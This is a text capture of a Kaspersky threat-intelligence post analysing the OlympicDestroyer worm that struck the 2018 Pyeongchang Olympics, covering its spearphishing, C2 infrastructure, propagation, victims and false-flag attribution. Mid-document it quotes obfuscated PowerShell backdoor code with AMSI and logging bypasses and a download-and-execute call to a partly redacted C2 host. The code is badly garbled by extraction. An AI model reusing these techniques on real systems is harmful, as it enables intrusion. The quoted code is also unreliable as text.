T HREAT SCAT EGORIEST AGSENCYCLOPEDIAST AT IST ICS DESCRIPT IONSEnglishKaspersky Security Bulletin. Overall statistics for 2017Kaspersky Security Bulletin: Review of the Year 2017Kaspersky Security Bulletin: Threat Predictions for 2018Kaspersky Security Bulletin 2016. Review of the year. Overall statistics for 2016Kaspersky Security Bulletin. Predictions for 2017Kaspersky Security Bulletin 2015. Overall statistics for 2015APT REPORT SOlympicDestroyer is here to OlympicDestroyer is here to trick the industry trick the industryBy GReAT on March 8, 2018. 5:00 pmA couple of days after the opening ceremony of the Winter Olympics in Pyeongchang, South Korea, we received information from several partners, on the condition of non-disclosure (T LP:Red), about a devastating malware attack on the Olympic infrastructure. A quick peek inside the malware revealed a destructive self-modifying password-stealing self-propagating malicious program, which by any definition sounds pretty bad.According to media reports, the organizers of the Pyeongchang Olympics confirmed they were investigating a cyberattack that temporarily paralyzed IT systems ahead of official opening ceremonies, shutting down display monitors, killing Wi-Fi, and taking down the Olympics website so that visitors were unable to print tickets. We also found other attempts to wreak havoc at companies working closely with the Winter Olympics.Malware features Malware featuresSeveral files related to the cyberattack were uploaded to VirusT otal on the day of the attack and were quickly picked up by other security researchers. As we were researching this attack, the Cisco T alos team published a brief description of the malware which T alos got from an undisclosed source. In their blog T alos highlighted some similarities between the attack, Netya (Expetr/NotPetya) and BadRabbit (targeted ransomware).T he T alos publication effectively removed the T LP constraint as the information had now becomeSave web pages as PDF with PDFmyURLpublic and could be referenced in this way. However, we decided not to jump to conclusions, especially with regards to attribution, and spent time researching it calmly and methodologically, while we continued to discover more and more false flags and controversies in the malware.T he main malware module is a network worm that consists of multiple components, including a legitimate PsExec tool from SysInternals’ suite, a few credential stealer modules and a wiper. From a technical perspective, the purpose of the malware is to deliver and start the wiper payload which attempts to destroy files on the remote network shares over the next 60 minutes. Meanwhile, the main module collects user passwords from browser and Windows storage and crafts a new generation of the worm that contains old and freshly collected compromised credentials. T he new generation of the worm is pushed to accessible local network computers and starts using the PsExec tool, leveraging the collected credentials and current user privileges.Once the wiper has run for 60 minutes it cleans Windows event logs, resets backups, deletes shadow copies from the file system, disables the recovery item in the Windows boot menu, disables all the services on the system and reboots the computer. T hose files on the network shares that it managed to wipe within 60 minutes remain destroyed. T he malware doesn’t use any persistence and even contains protection (also a killswitch) against recurring reinfection. Incidentally, only 1MB of the remote files are fully overwritten with zeroes; larger files were wiped with just 1K of zeroes in the header. T he local files are not destroyed and the worm doesn’t wipe itself or its components.Save web pages as PDF with PDFmyURLFig.1 OlympicDestroyer component relations Fig.1 OlympicDestroyer component relationsReconnaissance stage Reconnaissance stageSeveral companies have blogged about OlympicDestroyer’s attribution, it’s features and propagation method, but no one has discovered how exactly it was launched and from where. T hat’s where we had a little bit more luck.Since December 2017 security researchers have been seeing samples of MS Office documents in spearphishing emails related to the Winter Olympics uploaded to VirusT otal. T he documents contained nothing but slightly formatted gibberish to make it look like the text had an encoding problem, encouraging the user to press a button to “Enable Content”.Save web pages as PDF with PDFmyURLFig.2 Screenshot of attachment from a spearphishing email. Fig.2 Screenshot of attachment from a spearphishing email.When the victim “enables content”, the document starts a cmd.exe with a command line to execute a PowerShell scriptlet that, in turn, downloads and executes a second stage PowerShell scriptlet and, eventually, backdoors the system. T he only apparent links between this email campaign and OlympicDestroyer would have been the target, however, we managed to discover a couple of connections between this weaponized document and the attack in Pyeongchang which makes us believe they are related.For this investigation, our analysts were provided with administrative access to one of the affected servers located in a hotel based in Pyeongchang county, South Korea. A triage analysis was conducted on this Windows server system. T he affected company also kindly provided us with the network connections log from their network gateway. T hanks to this, we confirmed the presence of 1 31 .2 55.*.* which is located in malicious traffic to a malicious command and control server at IP 1 31 .2 55.*.* Ar ge nt ina Ar ge nt ina . T he infected host established multiple connections to this server on ports from the following list:443 8880Save web pages as PDF with PDFmyURLAr ge nt ina was purchased from a reseller company in Bulgaria, which kindly assisted usT he server in Ar ge nt ina in this investigation. T he company shared that the server was purchased from Norway, by a person using a Protomail account:Name: S im o n *** S im o n ***Email: sim o n***@pr o t o nm ail.co m sim o n***@pr o t o nm ail.co mLast Login Date: 2 01 8-02 -07 1 6:09 2 01 8-02 -07 1 6:09IP Address: 82 .1 02 .*.*82 .1 02 .*.* (Norway)Server purchased on: 2 01 7 -1 0-1 0 2 01 7 -1 0-1 0We were able to further connect this to a suspicious looking domain, with a registration address and phone number from Sweden:Domain: m icr o so f t ******[.]co m m icr o so f t ******[.]co mRegistration name: Elvis **** Elvis ****Email: e lvis***@m ail.co m e lvis***@m ail.co mRegistration date: 2 01 7 -1 1 -2 8 2 01 7 -1 1 -2 8Before getting suspended in December 2017 for failing the ICANN email verification check, the domain registration was privacy-protected. T his shielded the registration data, except the DNS servers, which indicate it was purchased via MonoVM, a VPS for a bitcoin provider:Name Server: monovm.earth.orderbox-dns[.]com Name Server: monovm.mars.orderbox-dns[.]com Name Server: monovm.mercury.orderbox-dns[.]com Name Server: monovm.venus.orderbox-dns[.]comSave web pages as PDF with PDFmyURLName server history:Fig.3 N ame server history for microsoft*****.com Fig.3 N ame server history for microsoft*****.comT his email popped up as a contact detail for a small network inside the 89.2 1 9.*.* located in Kaz akhst an Kaz akhst an . T his is where the trail ends for now. We apologize for not disclosing the full information as we would like to avoid random interactions with this contact. Full information has been provided to law enforcement agencies and customers subscribed to our APT Intel reporting service.89.2 1 9.*.* range that isT o manage the server in Argentina, Simon *** used the IP address in Norway (82 .1 02 .*.*) gateway of a VPN service known as No r dVPN VPN services for bitcoins.82 .1 02 .*.*) . T his is the No r dVPN (url that offers privacy-protectedIt’s not the first time the name NordVPN has cropped up in this case. We previously saw a weaponized Word document used in spearphishing emails targeting the Winter Olympics that contained something that looked like garbage text taken from a binary object (e.g. pagefile or even raw disk). However, part of the random data included two clearly readable text strings (highlighted below) that made it into the document (md5: 5ba7 ec869c7 157 efc1e52f5157 7 05867 ) for no obvious reason:Save web pages as PDF with PDFmyURLFig. 4 A reference to N ordVP N openvpn config file Fig. 4 A reference to N ordVP N openvpn config fileOf course, this is a low confidence indicator, but seems to be another link between the spearphishingSave web pages as PDF with PDFmyURLcampaign on the Winter Olympics and the attackers responsible for launching the OlympicDestroyer worm. In addition, this document includes a PowerShell command that closely resembles the PowerShell backdoor found in the network of the OlympicDestroyer victim. A comparison of this code is available below.T he PowerShell scripts listed below were used in the weaponized documents and as standalone backdoors. As standalone fileless backdoors, they were built and obfuscated using the same tool. Both scripts use a similar URL structure and both implement RC4 in PowerShell, as well as using a secret key passed to the server in base64 via cookies.S pe ar phishing case in S o ut h Ko r e a S pe ar phishing case in S o ut h Ko r e aPo we r she ll f o und o n Po we r she ll f o und o nO lym picDe st r o ye r vict im O lym picDe st r o ye r vict imtRUE}}}};;Invoke((UserUser––Agen Agen“VaLUE”::::“e“eGCI VARiabLegCi VariABLEObjecT SystemVARiabLe::fZS3aVVariABLE::FzS3AVfZS3aV )) “vAlUe”FzS3AV )) “VaLUE”variaBLe ((“fX32R” “fX32R”Trident//7.07.0;; rvrv::11.0“PROXy”== (( variaBLe“hEADERs” AddAdd InvokeMozilla//5.05.0 ((WindowsVAlUeO ))::::“DefaultWebProxy”(( gCi System NetNet Webcli Webcli $${{wCwC}}==^^&&NEWNEW––ObjecT Windows NTNT 6.16.1;;WW entent;;$${{uu}}==Mozilla 11.0))like “vAlUe”::::“s“s $${{DD}},,$${{KK}}==$${{ArGs $${{ss}}==0 255 $${{SS}}[[$${{__}}]]“CREdENtials” == (( GETGET “VAlue”::::“dEFauLT 0 255^^||^^&&((‘%’‘%’))“pRoxY” “CREdENtials”“DefaultWebProxy”;;vaRiABle ((‘hE7KU’‘hE7KU’)))) “VAlue”“asCiI” GetBytes“couNt”]]))%%256256;;GetBytes Invok InvokXNLO::::“asCiI”0 255;;0 255Save web pages as PDF with PDFmyURLNulL));;PSVeRsIon MAJORASSEmbly GETTYPE‘lockLogging’]]==00;;ObJecT CoLLectIOnS‘ScriptB’++‘lockLogging’‘ScriptB’++‘lockLogging’PSVERsIoNTAbLe PSVeRsIonScriptBlOcK]] “GeTFiE`Ld”‘onPublic,Static’)) GEtVALUe‘lockLogging’]])){{$$GPGP ‘lockLogging’]][[‘EnableScri ‘EnableScri‘onPublic,Static’)) SETValUE CoLLectIOnS GeNeRICMAJOR ––GG ee 33)){{$$GPSGPS==[[ReFReF]] ASSEmbly ‘Syst em.Management.Automation.Utils’)) “GeTF em.Management.Automation.Utils’ ie`Ld”((‘cachedGroupPolicySettings’ ‘cachedGroupPolicySettings’,,‘N’‘N’ IfIf(($$GPSGPS[[‘ScriptB’ ScriptBlockInvocationLogging’]]==00}}ElSE “GeTFiE`Ld”((‘signatures’ ,,‘N’‘N’++‘onPublic,Static’ GETTYPe((‘S‘S ystem.Management.Automation.AmsiUtils’ ystem.Management.Automation.AmsiUtils’ GEtField((‘amsiInitFailed’ ))||??{{$$__}}||%%{{$$__ GEtField $$wCwC==NeWNeW––ObJect WEBClIeNT;; $$uu==‘Mozilla/5.0 (Windows NT 6.1; WOW6 ‘Mozilla/5.0 (Windows NT 6.1; WOW6 4; Trident/7.0; rv:11.0) like Gecko’ 4; Trident/7.0; rv:11.0) like Gecko’;; $$wCwC PROxYHEADErS AddAdd((‘User-Agent’ ProXY==[[SYsTeMSYStem NeTNeT SerVicePoinTMANAGeR‘NonPublic,Static’)) SEtVALueSerVicePoinTMANAGeR]]::::EXPEXPstRing]]))))}}[[ReFReF]] AssEmbLYSYsTeM NETNET WeBREqUesTCredentIAlS == [[SYsTemSySTem NEtNEt WEBClIeNT‘User-Agent’,,$$uu));;PROxY CredentIAlSAssEmbLY GETTYPeWeBREqUesT]]::::DEDESEtVALue(($$nULLObJect SySTemSYsTem NEtNEt CCInvoke((cookie$${{__}}––BxoR“hEadeRS” AddAdd InvokeBxoR$${{SS}}[[(($${{ss}}[[$${{II}}]]++$${{SS}}[[$${{ABWjqj0NiqToVn0TW2FTlHIAApw==));; https:://minibo***[.]cl:443; //minibo***[.]cl:443;$${{II}}==(($${{II}}++11))%%256256;; $${{hh}}==(($${{HH}}++$${{ss}}[[$${{II}}]]))%%256256;; $${{SS}}[[$${{II}}]],,$${{ss}}[[$${{HH}}]]==$${{ss}}[[$${{HH}}]],,}};; ++$${{KK}}))))^^|| IEXIEX &&&&SeT pASs–– &&&& CMdCMd exEexE //cc%%RmnRmn%%length]];; ExECuTiONPOLIcy bYbYNoprOFilE ––ExECuTiONPOLIcyexpRESsIon (([[ENVirOnMeNtdATa}}==$${{WcWc}} DownloadDataChaR[[]]]]((^^&& $${{RR}} $${{DAtAcomponents//com_tagsDownloadData Invokecom_tags//controller controllerdefault_tags phpphp;;NOnint ––wiNdOWSt‘svTI’,,‘procEsS’DaTA}}[[4 4 $${{dAtASeT RMNRMN==ecHowiNdOWSt hiddeNdAta}}==$${{DaTAdAtA}} lengthDATA}}[[0 30 3]];;cookie,,seseInvoke(($${{jOin[[ChaRARgs;;Proxy;;Script::Proxy0 255;;0 255COuNt]]))%%256256;;Text ENcOdingENcOding]]::::ASCIIProxy == $$wcwc Proxy0 255||%%{{$$JJ==(($$JJ++$$SS[[$$__]]++$$KK[[$$RedeNTialCacHe YTes((’94+K/L3OE?o@qRl>.:FPev7rtNb^|#im ’94+K/L3OE?o@qRl>.:FPev7rtNb^|#im $$DD,,$$KK==$$ARgs $$SS==0 255 __%%$$KK COuNt $$SS[[$$__]],,$$SS[[$$JJ]]==$$SS[[$$JJ]],,$$SS[[$$__]]}};; $$II==(($$II++11))%%256256;; $$HH==(($$HH++$$SS[[$$II]]))%%256256;; $$SS[[$$II]],,$$SS[[$$HH]]==$$SS[[$$HH]],,$$SS[[$$II]];; $$serser==‘url’ $$tt==‘/admin/get.php’ XXDownlOADDATA(($$serser++$$tt));; 0 3]];;bxor$$SS[[(($$SS[[$$II]]++$$SS[[$$HH]]))%%256256]]‘url’;;“Cookie”,,“session=zt8 “session=zt8daTA==$$WCWC DownlOADDATAdatA==$$dATa joiN[[CHARHeAders AddAdd((“Cookie”‘/admin/get.php’;;CHAR[[]]]]((&& $$RR $$dAtadAta (($$IVIV++$$KK))))||IEIEdATa[[4 4 $$datadata leNgthleNgth]];;DATa[[0 3Lateral movement Lateral movementDespite the network worm’s self-replicating feature, the attackers did some manual lateral movement before starting on the destructive malware. We believe this was done to look for a better spot to release the worm. T hey seemed to be moving through the network via Psexec and stolen credentials, opening a default meterpreter port (T CP 4444) and downloading and running a backdoor (meterpreter). T he attackers also checked the network configuration, potentially searching for servers attached to multiple networks or VPN links in order to penetrate adjacent networks that could be linked to the Olympic Committee infrastructure.Save web pages as PDF with PDFmyURLOne of the hosts in the network of the affected ski resort hotel had Kaspersky Lab’s system watcher component enabled, which collected quite a few of the artifacts used by the attackers for lateral movement. According to the telemetry from this host, the attackers entered the system on 6 February, 2018. T hey used three types of PowerShell scriptlets: T CP 4444 port opener, ipconfig launcher and a downloader.Based on telemetry we received from one of the hosts, we built a timeline of the attackers’ activity and a histogram showing when the attackers started executables on the system.Fig.5 Histogram with attacker activity per hour of day Fig.5 Histogram with attacker activity per hour of dayFrom this we can see that the attackers were mostly busy outside of office hours according to Korean Standard T ime (UT C+9), perhaps to attract less attention or simply due to their own timezone.Worm propagation Worm propagationOlympicDestroyer is a network worm that collects user credentials with hostnames. New data is appended to the end of an existing collection. Having multiple samples of the worm from different networks allows us to reconstruct the path of the worm and find the source of distribution (or at least its hostname and list of users).Save web pages as PDF with PDFmyURLFig.6 OlympicDestroyer worm propagation Fig.6 OlympicDestroyer worm propagationT he diagram above was built based on extracted lists of credentials with hostnames and some alleged roles of the servers based on respective names. We can see there were at least three independent launch pads for the worm: Atos.net company, ski resort hotels, and the Pyeongchang2018.com server.At some point, samples with a list of credentials were uploaded to VirusT otal where they were found by security researchers that executed the worm in a sandbox environment and uploaded the new generation on VirusT otal again. T here are a number of samples on VT that contain credentials fromSave web pages as PDF with PDFmyURLthose sandbox machines. Nevertheless, it’s clear the network worm wasn’t started there initially, but was instead coming from one of the known launch pads.Victims VictimsSpearphishing emails were used to target the networks of official partners of the Winter Olympics. T he attackers probably went to the official website to find out the names of the partner companies, figured out their domain names, collected known email addresses and started bombarding them with spearphishes.One of these weaponized documents was uploaded to VT from South Korea on 29 December, 2017 inside an email file (6b7 28d2966194968d12c56f8e3691855). T he sender address imitates the South Korean NCT C (National Counter-T errorism Center), while the sender’s server IP originates from a server in Singapore.Fig.7 Fake sender address. Fig.7 Fake sender address.T he email appears to have been sent to ice ho cke y@pye o ngchang2 01 8[.]co m real targets are in the following list:ice ho cke y@pye o ngchang2 01 8[.]co m . However, theSave web pages as PDF with PDFmyURLIndust r y Indust r yT ar ge t Co m pany/O r ganiz at io n Do m ain T ar ge t Co m pany/O r ganiz at io n Do m ainGovernment organizationEnterpriseEnergySemiconductorT ransportHospitalMediaAdvertisingairport.co.kr customs.go.kr kepco.co.kr kma.go.kr sports.or.krsk.com kt.comesco-posco.co.kr posco.co.krskhynix.com us.skhynix.comkoreanair.com hanjin.co.krgnah.co.krdonga.comppcom.kr samikdisplay.co.kr (LED display company) tkad.co.kr vestceo@naver.com (LED Panel Advertising company email)Resort/Hotelalpensiaresort.co.kr yongpyong.co.krT he attackers appear to have got sloppy when they searched for email addresses that ended with those targeted domains. Using short domain names such as sk.com or kt.com wasn’t a good idea. T his went unnoticed and a few totally unrelated companies with domain names ending with sk.com and kt.com received spearphishing emails:krovy-sk.co msk.co m (Wood company in Slovakia)Save web pages as PDF with PDFmyURLsk.co m (Mining-related company in Canada) kt .co m (Finance company in Laos) kt .co m (Software company in Australia)okc-sk.co m bcel-kt .co m kuhlekt .co m wertprojekt .co mkt .co m (Real estate company in Germany)Based on all the evidence we discovered, the following networks seem to have been breached in the attack:Software vendor responsible for automation at ski resorts T wo ski resort hotels in South Korea IT service provider (Atos.net) headquartered in France com attached networkConsidering the malware was spread as a network worm via Windows network shares, collateral damage was inevitable. T hrough one of the victims who uploaded the dropper file to VT from Austria, we were able to extract the hostname from the stolen credentials stored in the malware: AT VIESVIES 2BQA. While it may look like a random sequence of characters at first glance, we speculate that AT stands for the host country code (Aust r ia Aust r ia ) which matches the submitter source country, followed by the organization name “VIES” with some extra random characters uniquely identifying the host. According to OSINT , there is only one large organization that matches this name in Austria – the VAT Inf o r m at io n Exchange S yst e m VAT Inf o r m at io n Exchange S yst e m used throughout the European Union. VIES is a search engine owned by the European Commission. So, it’s either a compromised host of Atos which role is to communicate with the Austrian VIES or the Austrian VIES indeed is indeed in collateral damage of the malware’s network propagation.But the main outbreak of the worm that we investigated was at a hotel in a South Korean winter resort. T he hotel didn´t upload any samples to VT , which is why it remained unknown. We assume many other companies attacked in South Korea did the same, which reduced the visible surface of the attacked infrastructure.While we cannot name the hotel chain, we can say that one of its hotels located in a ski resort in Pyeongchang was subjected to an attack. Despite the close proximity to the Olympic Games, the resort was not one of the official winter parks staging the games. However, it is definitely part of the surrounding infrastructure that hosted numerous guests and possibly even sports teams competing at the Olympics. In an interview with the owners, we found out that the malware disabled ski gatesSave web pages as PDF with PDFmyURLand ski lifts that were operated from one of the attacked servers. Our analysis showed that this was not collateral damage. T he attackers deliberately chose to start the spread of the destructive worm from this dedicated ski resort automation server. T hat server was the so-called patient-zero in the network. T he timing was also chosen to precede the official opening ceremony by a couple of hours, allowing the worm to propagate deep enough into networks to cause maximum inconvenience for those using the affected infrastructure. As a matter of fact, the plan was to let the worm gain better visibility in the news.Attribution hell Attribution hellIn their blog the Cisco T alos researchers also pointed out that OlympicDestroyer used similar techniques to Badrabbit and NotPetya to reset the event log and delete backups. Although the intention and purpose of both implementations of the techniques are similar, there are many differences in the code semantics. It’s definitely not copy-pasted code and because the command lines were publicly discussed on security blogs, these simple techniques became available to anyone who wants to use them.Save web pages as PDF with PDFmyURLFig.8 Event logs cleaning and disabling system recovery in OlympicDestroyer and N otP etya Fig.8 Event logs cleaning and disabling system recovery in OlympicDestroyer and N otP etyaSoon after the T alos publication, Israeli company IntezerLabs tweeted that they had found links to Chinese APT groups.Fig.9 Announcement of connection to Chinese AP Ts by IntezerLabs on 12 Feb, 2018 Fig.9 Announcement of connection to Chinese AP Ts by IntezerLabs on 12 Feb, 2018IntezerLabs released a blogpost with an analysis of features found using their in-house malware similarity technology.A few days later media outlets started publishing articles suggesting potential motives and activities by Russian APT groups: “Crowdstrike Intelligence said that in November and December of 2017 it had observed a credential harvesting operation operating in the international sporting sector. At the time it attributed this operation to Russian hacking group Fancy Bear”…”.On the other hand, Crowdstrike’s own VP of Intelligence, Adam Meyers, in an interview with the media said: “T here is no evidence connecting Fancy Bear to the Olympic attack”.However, a couple of weeks later, the Russian trace was brought up again by the Washington Post, which claimed that Russian military spies were behind the Winter Olympics attack, citing “two U.S. officials who spoke on the condition of anonymity”. Unfortunately, such articles based on anonymous sources contain no verifiable information and bring no real answers – they only spread rumors.Save web pages as PDF with PDFmyURLMicrosoft’s security team also seems to have been tricked by the malware as their internal detection was triggered on the potential use of EternalRomance exploit (MS17 -010).Fig.10 Microsoft security team claims they found EternalRomance in OlympicDestroyer Fig.10 Microsoft security team claims they found EternalRomance in OlympicDestroyerA couple of days later Microsoft had to retract those claims as they were simply not confirmed.Fig.11 Microsoft security team retracts previous claims in a subsequent tweet Fig.11 Microsoft security team retracts previous claims in a subsequent tweetSave web pages as PDF with PDFmyURLT he day after we released a private report with forensic findings and detailed analysis of this attribution hell to our APT Intel subscribers (for more information please contact: intelreports@kaspersky.com), the Cisco T alos team decided to revisit OlympicDestroyer and go public with a similar review. We сan’t help but agree with this nice write-up with code comparison, because we came to very similar conclusions.In addition, T alos researchers noted that the evtchk.txt filename, which the malware used as a potential false-flag during its operation, was very similar to the filenames (evtdiag.exe, evtsys.exe and evtchk.bat) used by BlueNoroff/Lazarus in the Bangladesh SWIFT cyberheist in 2016.Recorded Future decided to not attribute this attack to any actor; however, they claimed that they found similarities to BlueNoroff/Lazarus LimaCharlie malware loaders that are widely believed to be North Korean actors.We can’t dispute that part of the code really does resemble the Lazarus code. T he wiper modules used in OlympicDestroyer (MD5: 3c0d7 40347 b0362331c882c2dee96dbf) and Bluenoroff (MD5: 5d0ffbc8389f27 b0649696f0ef5b3cfe) used similar code to wipe files.Fig.12 Comparison of wiping module (left: Bluenoroff tool; right: OlympicDestroyer) Fig.12 Comparison of wiping module (left: Bluenoroff tool; right: OlympicDestroyer)T here is also a high level of similarity between Lazarus and OlympicDestroyer. T here are modules inSave web pages as PDF with PDFmyURLboth campaigns that used the same technique to decrypt a payload in memory using a secret password provided via a command line. Lazarus used this in their malware loaders (Recorded Future also mentions a similarity in malware loader code) to protect their backdoor modules from reverse engineering as they contained some default C2 information.Despite the resemblance in the method, there are significant differences in its usage: 1. Lazarus used long and reliable alphanumeric passwords (30+ characters long). OlympicDestroyeron the contrary used a very simple password: “123”.2. Lazarus never hardcoded its passwords for protected payloads into the malware body.OlympicDestroyer on the contrary hardcoded it (there was actually no other way, because the worm had to spread itself and run fully autonomously). T hat’s why the whole idea of using password-protected payloads in the network worm looks ridiculous, and we believe it’s unlikely an actor such as Lazarus would implement techniques like that considering their previous T T Ps.T he possibility of North Korean involvement looked way off mark, especially since Kim Jong-un’s own sister attended the opening ceremony in Pyeongchang. According to our forensic findings, the attack was started immediately before the official opening ceremony on 9 February, 2018.What we discovered next brought a big shock. Using our own in-house malware similarity system we have discovered a unique pattern that linked Olympic Destroyer to Lazarus. A combination of certain code development environment features stored in executable files, known as Rich header, may be used as a fingerprint identifying the malware authors and their projects in some cases. In case of Olympic Destroyer wiper sample analyzed by Kaspersky Lab this “fingerprint” gave a 100% match with previously known Lazarus malware components and zero overlap with any other clean or malicious file known to date to Kaspersky Lab.Yet the motives and other inconsistencies with Lazarus T T Ps made some of our researchers skeptically revisit that rare artefact. With another careful look into these evidence and manual verification of each feature we discovered that the set of features doesn’t match the actual code. At that moment it became clear that the set of features was simply forged to perfectly match the fingerprint used by Lazarus. Considering that this is not very well explored area in malware analysis and attribution, we decided to share some more information on how we proved in a dedicate blogpost with some deep technical details.Save web pages as PDF with PDFmyURLWe also noticed that there exists a wiper module with original Rich header and it was uploaded to VirusT otal from France where one of the victims (Atos) is located. T he compilation timestamp was 2 01 8-02 -09 1 0:4 2 :1 9 2 01 8-02 -09 1 0:4 2 :1 9 which is almost 2 hours after attack in Pyeongchang ski resorts started. It’s unclear what went wrong but it looks like the attackers rushed to modify the worm’s wiper component, so that it immediately disabled system services and rebooted the machine instead of waiting for 60 minutes. T hey seem to wanted immediate results as there were just minutes before the official opening ceremony started.Considering all of the above it it now looks like a very sophisticated false flag which was placed inside the malware intentionally in order to give threat hunter impression that they found a smoking gun evidence, knocking them of the trail to the accurate attribution.Conclusions ConclusionsWhat conclusions can we draw from this?It really depends on how clever the attacker behind this campaign is.If Lazarus was the smartest of all, then they could have crafted a sophisticated false flag that would be hard to discover, requiring even more sophistication to prove it’s a forgery. However, the level of researcher sophistication is something that’s difficult for attackers to gauge. T he level of complexity we’re talking about would definitely reduce reliability and couldn’t guarantee that everything went to plan. In addition, Lazarus had no rational motive to conduct this attack, not to mention T T Ps that obviously weren’t theirs.Speaking of T T Ps, we have seen attackers using NordVPN and MonoVM hosting. Both services are available for bitcoins, which make them the perfect tool for APT actors. T his and several other T T Ps have in the past been used by the Sofacy APT group, a widely known Russian-language threat actor. A year ago we published our research about the Lazarus APT group using false flags in attacks against banks around the world that pointed to a Russian origin. Was it payback from Russian-speaking Sofacy or was it someone else trying to frame Sofacy? T he muddied waters of this case mean we are yet to get a clear answer.Save web pages as PDF with PDFmyURLT here are some open questions about the attacker’s motivation in this story. We know that the attackers had administrative accounts in the affected networks. By deleting backups and destroying all local data they could have easily devastated the Olympic infrastructure. Instead, they decided to do some “light” destruction: wiping files on Windows shares, resetting event logs, deleting backups, disabling Windows services and rebooting systems into an unbootable state. When you add in the multiple similarities to T T Ps used by other actors and malware, intentional false flags and relatively good opsec, it merely raises more questions as to the purpose of all this.As we see it, these are some of the possible motives behind the attack: 1. Demonstration of power/skills in the context of a secret communication that we’re unaware of.T he potential for full-blown, highly destructive cybersabotage might be a strong argument in top- secret political negotiations.2. T esting of destructive worm capability, but with lower impact to avoid too much attention frompotential investigators and general public (in case of human error or operational failure).3. T rap threat intel researchers in a field of false flags and, based on their responses, learn how toimplement the perfect false flag.T he last option makes sense when you consider that the malware contained a wiper that wasn’t used to wipe its own components – the authors wanted it to be discovered.For a powerful attacker learning how to reliably craft false flags and trick researchers into attributing the attack to someone else can mean gaining the ultimate cover – total immunity against attribution. But this kind of rocket science requires real-life experiments.We think the carefully orchestrated OlympicDestroyer campaign played a very important role that will shape APT research in the future. While it didn’t fully sabotage the Winter Olympic games in Pyeongchang, its effects were noticed not only in South Korea but also in Europe. Most importantly, it brings with it a potential threat to the attribution process, undermining trust in intel research findings.T here’s a lesson to be taken from this attack that’s useful for all of us in threat intelligence – don’t rush with attribution. T his is a very delicate subject that should be handled with great care. We as an industry shouldn’t sacrifice the accuracy of our research to opportunistically promote business.Save web pages as PDF with PDFmyURLKnown OlympicDestroyer executables Known OlympicDestroyer executables0311CEC923C57 A435E7 35E106517 7 97 F 104ECBC27 467 02FA6ECD4562A867 E7 FB 3514205D697 005884B3564197 A6E4A34 3C0D7 40347 B0362331C882C2DEE96DBF 47 E67 D1C9382D6237 0A0D7 1FECC5368B 4C8FA37 31EFD2C5097 E903D5007 9A44D 4F43F037 83F97 89F804DCF9B947 4FA6D 51545ABCF4F196095ED102B0D08DEA7 E 527 7 5F24E230C96EA5697 BCA7 9C7 2C8E 567 D37 9B87 A547 50914D2F0F6C3B657 1 57 7 8D8FF5156DE1F63361BD530E0404D 583F05B4F17 24ED2EBFD06DD29064214 58DD6099F8DF7 E5509CEE3CB27 9D7 4D5 59C3F3F99F44029DE81293B1E7 C37 ED2 64AA21201BFD88D521FE90D44C7 B5DBA 65C024D60AF18FFAB051F97 CCDDFAB7 F 6897 0B2CD5430C812BEF5B87 C1ADD6EA 6E0EBEEEA1CB00192B07 4B288A4F9CFE 7 C3BF9AB05DD803AC218FC7 084C7 5E96 83D8D40F435521C097 D3F6F4D2358C67 86D1A184850859A6A4D1C35982F3C40EAPT BACKDOOR MALWARE DESCRIPT ION SPEARPHISHING VULNERABILIT IES AND EXPLOIT S WIPER WORMSave web pages as PDF with PDFmyURLShare post on:  Related Posts Related PostsYour new friend, KLaraThreat Landscape for Industrial Automation Systems in H2 2017Masha and these BearsLEAVE A REPLY LEAVE A REPLY Your e mail addre ss will not be publishe d. Re quire d fie lds are marke d *Ente r your comme nt he reName *Email *Notify me whe n ne w comme nts are adde d.SUBMITSave web pages as PDF with PDFmyURLreCAPTCHAPlease upgrade to a supported browser to get a reCAPTCHA challenge.Alternatively if you think you are getting this page in error, please check your internet connection and reload.Why is this happening to me?© 2018 AO Kaspe rsky Lab. All Rights Re se rve d. Re giste re d trade marks and se rvice marks are the prope rty of the ir re spe ctive owne rs.EmailSUBSCRIBEContact us | Privacy Policy | Lice nse Agre e me ntSave web pages as PDF with PDFmyURLSave web pages as PDF with PDFmyURL 